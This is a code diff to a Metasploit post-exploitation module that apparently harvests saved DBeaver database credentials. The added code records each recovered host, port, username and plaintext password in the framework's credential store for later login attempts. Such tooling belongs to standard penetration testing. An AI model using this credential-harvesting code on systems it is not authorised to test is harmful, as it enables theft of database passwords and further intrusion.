@@ -62,6 +62,16 @@ class MetasploitModule < Msf::Post
     all_result.each do |item|
       item.each do |_key, value|
         pw_tbl << value.values
+        next if value['user'].empty? && value['password'].empty?
+
+        config = {
+          type: value['provider'],
+          host: value['host'],
+          port: value['port'],
+          username: value['user'],
+          password: value['password']
+        }
+        dbeaver_store_config(config)
       end
     end
     if pw_tbl.rows.count > 0
@@ -69,6 +79,34 @@ class MetasploitModule < Msf::Post
       print_good("Passwords stored in: #{path}")
       print_good(pw_tbl.to_s)
     end
+  end
+
+  def dbeaver_store_config(config)
+    service_data = {
+      address: config[:host],
+      port: config[:port],
+      service_name: config[:type],
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+
+    credential_data = {
+      origin_type: :session,
+      session_id: session_db_id,
+      post_reference_name: refname,
+      private_type: :password,
+      private_data: config[:password],
+      username: config[:username]
+    }.merge(service_data)
+
+    credential_core = create_credential(credential_data)
+
+    login_data = {
+      core: credential_core,
+      status: Metasploit::Model::Login::Status::UNTRIED
+    }.merge(service_data)
+
+    create_credential_login(login_data)
   end
 
   def parse_json_dir(json_dir)
